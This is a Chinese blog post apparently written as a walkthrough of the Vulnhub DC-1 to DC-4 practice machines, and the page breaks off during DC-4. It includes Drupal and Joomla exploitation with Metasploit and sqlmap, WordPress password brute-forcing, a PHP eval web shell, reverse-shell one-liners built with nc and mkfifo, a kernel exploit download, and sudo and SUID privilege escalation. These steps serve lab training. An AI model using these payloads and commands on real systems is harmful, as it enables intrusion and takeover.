<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Vulnhub - DC1-9 | MssnHarvey</title><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DC-1准备工作DC-1（nat模式）；kali（nat模式）  信息搜集首先我们对其进行内网扫描 1arp-scan -l  这里我直接浏览器对其访问发现的  Wappalyzer查看其服务信息发现cms是Drupal 7  或者用nmap扫描 1nmap -sP 192.168.232.0&#x2F;24   接着扫波目录，发现都没啥卵用 1dirb http:&#x2F;&#x2F;192.168.232.141&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="Vulnhub - DC1-9">
<meta property="og:url" content="https://mssnharvey.github.io/2023/12/11/Vulnhub-DC/index.html">
<meta property="og:site_name" content="MssnHarvey">
<meta property="og:description" content="DC-1准备工作DC-1（nat模式）；kali（nat模式）  信息搜集首先我们对其进行内网扫描 1arp-scan -l  这里我直接浏览器对其访问发现的  Wappalyzer查看其服务信息发现cms是Drupal 7  或者用nmap扫描 1nmap -sP 192.168.232.0&#x2F;24   接着扫波目录，发现都没啥卵用 1dirb http:&#x2F;&#x2F;192.168.232.141&#x2F;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://mssnharvey.github.io/imgs/Vulnhub-DC.jpg">
<meta property="article:published_time" content="2023-12-11T07:00:00.000Z">
<meta property="article:modified_time" content="2026-02-12T14:35:08.952Z">
<meta property="article:author" content="Harvey">
<meta property="article:tag" content="Vulnhub">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://mssnharvey.github.io/imgs/Vulnhub-DC.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Vulnhub - DC1-9",
  "url": "https://mssnharvey.github.io/2023/12/11/Vulnhub-DC/",
  "image": "https://mssnharvey.github.io/imgs/Vulnhub-DC.jpg",
  "datePublished": "2023-12-11T07:00:00.000Z",
  "dateModified": "2026-02-12T14:35:08.952Z",
  "author": [
    {
      "@type": "Person",
      "name": "Harvey",
      "url": "https://mssnharvey.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/l1.jpg"><link rel="canonical" href="https://mssnharvey.github.io/2023/12/11/Vulnhub-DC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'medium_zoom',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Vulnhub - DC1-9',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/../imgs/Vulnhub-DC.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">MssnHarvey</span></a><a class="nav-page-title" href="/"><span class="site-name">Vulnhub - DC1-9</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub - DC1-9</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-11T07:00:00.000Z" title="发表于 2023-12-11 15:00:00">2023-12-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-12T14:35:08.952Z" title="更新于 2026-02-12 22:35:08">2026-02-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/">靶场通关</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>DC-1（nat模式）；kali（nat模式）</p>
<p><img src="/../imgs/Vulnhub-DC1.png"></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先我们对其进行内网扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p>这里我直接浏览器对其访问发现的</p>
<p><img src="/../imgs/Vulnhub-DC2.png"></p>
<p>Wappalyzer查看其服务信息发现cms是Drupal 7</p>
<p><img src="/../imgs/Vulnhub-DC3.png"></p>
<p>或者用nmap扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.232.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC4.png"></p>
<p>接着扫波目录，发现都没啥卵用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.232.141/</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC5.png"></p>
<h2 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>msf搜索目标cms版本漏洞，实现渗透</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search Drupal</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC6.png"></p>
<p>emmm，这里我们就用最新的漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 6</span><br><span class="line">set rhost 192.168.232.141</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC7.png"></p>
<p>芜湖，exit后选择4（第二新的）成功getshell</p>
<p><img src="/../imgs/Vulnhub-DC8.png"></p>
<p>反弹式的shell，进入交互界面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line"># 产生一个原生的终端</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>cat查看flag1.txt得到flag1</p>
<p><img src="/../imgs/Vulnhub-DC9.png"></p>
<p>Every good CMS needs a config file &#x3D;》 每个好的CMS都需要一个配置文件</p>
<p>于是乎我们去查查他的配置文件得到flag2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd sites</span><br><span class="line">ls</span><br><span class="line">cd default</span><br><span class="line">ls</span><br><span class="line">cat settings.php</span><br></pre></td></tr></table></figure>

<p>这里我们成功拿到数据库的账号密码，所以我们就登录进数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u dbuser <span class="operator">-</span>p</span><br><span class="line">根据上面得知的信息输入密码：R0ck3t</span><br><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC10.png"></p>
<p>接着查询数据库信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC11.png"></p>
<p>接着查表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC12.png"></p>
<p>发现关键信息users，查询里面的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC13.png"></p>
<p>得出账号密码，但是密码是hash加密过的，所以我们只能生成一个密码并得到其hash值进行替换</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php .<span class="operator">/</span>scripts<span class="operator">/</span>password<span class="operator">-</span>hash.sh <span class="number">123456</span></span><br><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> pass <span class="operator">=</span> <span class="string">&#x27;$S$DCJ9lkm5vxZFYzL4GsDQnRiKBURAPyzOv7gz3Zb/q9ZrOuZZ7Paf&#x27;</span> <span class="keyword">where</span> uid<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC14.png"></p>
<p>最后成功登录进去得到flag3</p>
<p><img src="/../imgs/Vulnhub-DC15.png"></p>
<p><img src="/../imgs/Vulnhub-DC16.png"></p>
<p>提示我们：特殊的PERMS可以帮助找到密码-但您需要-exec该命令来确定如何获取隐藏的内容。  通过 <code>find / -perm -4000</code> 寻找权限是-4000的文件即查找有特殊权限的命令</p>
<p><img src="/../imgs/Vulnhub-DC17.png"></p>
<p>利用find提权获取root权限，得到flag4</p>
<p><img src="/../imgs/Vulnhub-DC18.png"></p>
<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先内网扫描一波</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC19.png"></p>
<p>接着nmap扫一下他的端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 -A -sV 192.168.232.142</span><br></pre></td></tr></table></figure>

<p>ssh默认端口不是22？竟给改成了7744</p>
<p><img src="/../imgs/Vulnhub-DC20.png"></p>
<p>打开网页发现会打不开，这时就需要设置hosts文件才能访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">#输入i进行修改</span><br><span class="line">192.168.232.142         dc-2</span><br><span class="line">#保存返回 输入:x                                                                                                                                           </span><br><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC21.png"></p>
<p><img src="/../imgs/Vulnhub-DC22.png"></p>
<p>此时访问 <code>http://dc-2</code> 即可，打开发现是wp的</p>
<p><img src="/../imgs/Vulnhub-DC23.png"></p>
<p>发现flag1</p>
<p><img src="/../imgs/Vulnhub-DC24.png"></p>
<h2 id="漏洞攻击-1"><a href="#漏洞攻击-1" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>根据提示需要cewl，生成密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl -w passwords.txt http://dc-2</span><br><span class="line">cat passwords.txt</span><br></pre></td></tr></table></figure>

<p>接着我们使用专门扫wp的wpscan扫描用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC25.png"></p>
<p>最后成功得到三个用户名：admin、tom、jerry，并创建user.txt将其放入</p>
<p><img src="/../imgs/Vulnhub-DC26.png"></p>
<p>然后我们就可以根据所得user和passwords的字典用wpscan进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --ignore-main-redirect --url 192.168.232.142 -U user.txt -P passwords.txt --force</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC27.png"></p>
<p>最后我们成功爆破出了账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SUCCESS] - jerry / adipiscing                        [SUCCESS] - tom / parturient</span><br></pre></td></tr></table></figure>

<p>到这里，我们便可以ssh连进去了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.232.142 -p 7744</span><br><span class="line">parturient</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC28.png"></p>
<p>进去后发现shell被限制了，于是我们需要绕过rbash，然后设置环境变量，最终成功cat到flag3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line"> </span><br><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">/bin/bash</span><br><span class="line"> </span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line"> </span><br><span class="line">ls</span><br><span class="line">cat flag3.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC29.png"></p>
<p>根据提示我们再切换成用户jerry的,在jerry用户下得到flag4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">adipiscing</span><br><span class="line"> </span><br><span class="line">cd /home/jerry</span><br><span class="line">ls</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC30.png"></p>
<p>Go on - git outta here!!!!</p>
<p>我们接着git提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC31.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ls /root</span><br><span class="line">cat /root/final-flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC32.png"></p>
<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先扫波内网</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC33.png"></p>
<p>接着nmap扫一下可以看到开放了80端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A 192.168.232.145</span><br></pre></td></tr></table></figure>

<p>于是我们打开其网页看见其cms是joomla，并提示我们只有一个flag且需获取root权限</p>
<p><img src="/../imgs/Vulnhub-DC34.png"></p>
<p>接着我们用dirb扫下目录</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http<span class="punctuation">:</span><span class="comment">//192.168.15.139/</span></span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC35.png"></p>
<p>最后我们在 <code>README.txt</code> 目录下发现joomla是3.7的</p>
<h2 id="漏洞攻击-2"><a href="#漏洞攻击-2" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>通过以上信息，我们搜索一下joomla3.7漏洞发现存在sql注入</p>
<p><img src="/../imgs/Vulnhub-DC36.png"></p>
<p>接着我们开始构造url，可以看到确实是存在漏洞滴</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure>

<p>sqlmap查询一下数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.15.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC37.png"></p>
<p>再查一下表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.15.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)&quot; --risk=3 --level=5 --random-agent –D joomladb --tables -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC38.png"></p>
<p>然后再查一下列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.15.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC39.png"></p>
<p>最后查询账号得到一串hash加密的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.15.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; -C username,password --dump -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC40.png"></p>
<p>john解密得到密码为snoopy（不懂为啥我得不到&amp;cmd5也查不到.jpg 接着我们百度joomla3.7的默认后台得知为 <code>administrator</code> ；成功登进后台</p>
<h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><p>在Templates中发现可以修改php的文件，于是乎我们写个php的一句话木马上去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;harvey&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过蚁剑连接，写个反弹shell上传（蚁剑是非持续连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;1|nc 192.168.15.1402333/tmp/f</span><br></pre></td></tr></table></figure>

<p>然后访问此网站开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC41.png"></p>
<p>然后我们使用searchsploit工具来查找Ubuntu 16.04的提权漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC42.png"></p>
<p>查看该漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure>

<p>得到exp下载链接并下载，同时上传 <code>exploit.tar</code> 并解压运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">exp下载地址</span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">这里我是直接本地下载然后通过蚁剑上传</span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br><span class="line">ls</span><br><span class="line">tar xvf exploit.tar</span><br><span class="line">ls</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">ls</span><br><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC43.png"></p>
<p>不知道这里咋解决惹~蹲个大佬赐教.jpg</p>
<p>反正最后获取root权限后，在root目录下获取到flag</p>
<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>内网扫描一波找到目标，并通过nmap扫描其端口发现开着22、80端口</p>
<p><img src="/../imgs/Vulnhub-DC44.png"></p>
<p>访问目标发现是一个登录框并提示admin登录</p>
<p><img src="/../imgs/Vulnhub-DC45.png"></p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>利用burp的爆破模块得到账号密码为 <code>admin/happy</code>（但是我没爆破出来.jpg</p>
<p><img src="/../imgs/Vulnhub-DC46.png"></p>
<p>发现可以执行命令，于是尝试抓包改参数执行命令</p>
<p><img src="/../imgs/Vulnhub-DC47.png"></p>
<p>接着我们就可以构造payload通过nc反弹shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.233.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>

